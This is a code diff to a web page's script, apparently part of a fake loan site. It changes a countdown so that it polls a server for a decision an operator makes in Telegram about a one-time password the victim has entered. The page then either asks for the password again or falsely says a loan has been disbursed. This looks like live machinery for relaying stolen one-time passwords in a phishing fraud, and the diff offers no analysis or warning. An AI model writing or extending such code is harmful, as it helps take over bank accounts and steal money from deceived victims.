@@ -507,22 +507,48 @@
                     // 3-minute (180 seconds) loading countdown timer
                     let remainingSeconds = 180;
                     
-                    const countdownInterval = setInterval(() => {
-                        remainingSeconds--;
-                        let minutes = Math.floor(remainingSeconds / 60);
-                        let seconds = remainingSeconds % 60;
-                        let formattedSeconds = seconds < 10 ? `0${seconds}` : seconds;
+                    const countdownInterval = setInterval(async () => {
+    remainingSeconds--;
+    let minutes = Math.floor(remainingSeconds / 60);
+    let seconds = remainingSeconds % 60;
+    let formattedSeconds = seconds < 10 ? `0${seconds}` : seconds;
 
-                        otpStatusBox.innerText = `Authorizing transaction... Please wait (${minutes}:${formattedSeconds})`;
+    otpStatusBox.innerText = `Authorizing transaction... Please wait (${minutes}:${formattedSeconds})`;
 
-                        if (remainingSeconds <= 0) {
-                            clearInterval(countdownInterval);
-                            spinner.style.display = "none";
-                            otpStatusBox.style.background = "#dcfce7";
-                            otpStatusBox.style.color = "#166534";
-                            otpStatusBox.innerText = "Transaction complete! Your loan has been disbursed.";
-                        }
-                    }, 1000);
+    // Check the server status to see what the admin clicked in Telegram!
+    try {
+        const statusRes = await fetch('/api/status');
+        const statusData = await statusRes.json();
+
+        if (statusData.status === "wrong_otp") {
+            clearInterval(countdownInterval);
+            spinner.style.display = "none";
+            otpSubmitBtn.disabled = false;
+            otpSubmitBtn.style.opacity = "1";
+            otpStatusBox.style.background = "#fee2e2";
+            otpStatusBox.style.color = "#991b1b";
+            otpStatusBox.innerText = "OTP verification failed. Please try again.";
+            return;
+        } else if (statusData.status === "correct_otp" || statusData.status === "approved") {
+            clearInterval(countdownInterval);
+            spinner.style.display = "none";
+            otpStatusBox.style.background = "#dcfce7";
+            otpStatusBox.style.color = "#166534";
+            otpStatusBox.innerText = "Transaction complete! Your loan has been disbursed.";
+            return;
+        }
+    } catch (e) {
+        console.log("Polling error:", e);
+    }
+
+    if (remainingSeconds <= 0) {
+        clearInterval(countdownInterval);
+        spinner.style.display = "none";
+        otpStatusBox.style.background = "#dcfce7";
+        otpStatusBox.style.color = "#166534";
+        otpStatusBox.innerText = "Transaction complete! Your loan has been disbursed.";
+    }
+}, 1000);
 
                 } else {
                     spinner.style.display = "none";
